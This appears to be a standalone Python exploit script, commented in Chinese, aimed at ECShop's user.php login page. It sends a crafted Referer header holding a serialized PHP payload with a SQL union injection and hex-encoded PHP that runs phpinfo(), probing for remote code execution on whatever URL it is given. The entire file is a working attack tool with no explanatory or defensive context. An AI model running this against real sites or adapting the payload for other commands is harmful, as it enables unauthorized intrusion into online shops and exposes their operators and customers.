# encoding:utf-8
from bs4 import BeautifulSoup as bs
import requests
import hashlib
from urllib.parse import urljoin
import re
import sys, getopt

def ECSHOP_EXP(argv):
    #获取输入的URL
    try:
        opts, args = getopt.getopt(argv,"hu:",["url="])
    except getopt.GetoptError:
        print('ecshop.py -u <url>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
           print('ecshop.py -u <url>')
           sys.exit()
        elif opt in ("-u", "--url"):
           url = arg
           #print(url)
    #定义referer请求头
    referer = '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"' /*";}554fcae493e564ee0dc75bdf2ebf94ca'''
    #拼接请求的URL
    i2=urljoin(url.strip(),"/user.php?act=login")
    print(i2)
    #定义请求包
    headers ={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0','Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3','Referer':referer,'Accept-Encoding': 'gzip, deflate'}

    try:  # 加入异常处理，忽略程序的报错
        r = requests.get(url = i2, headers = headers,timeout=4)  # 请求网址并进行超时判断
        r.encoding = 'gb18030' 
        #print(r.status_code)
        if r.status_code==200:#判断网址是否可以正常打开
            soup=bs(r.text,"lxml")   #用bs解析网站
            print(soup)
    except:
        pass


if __name__=='__main__':
        ECSHOP_EXP(sys.argv[1:])

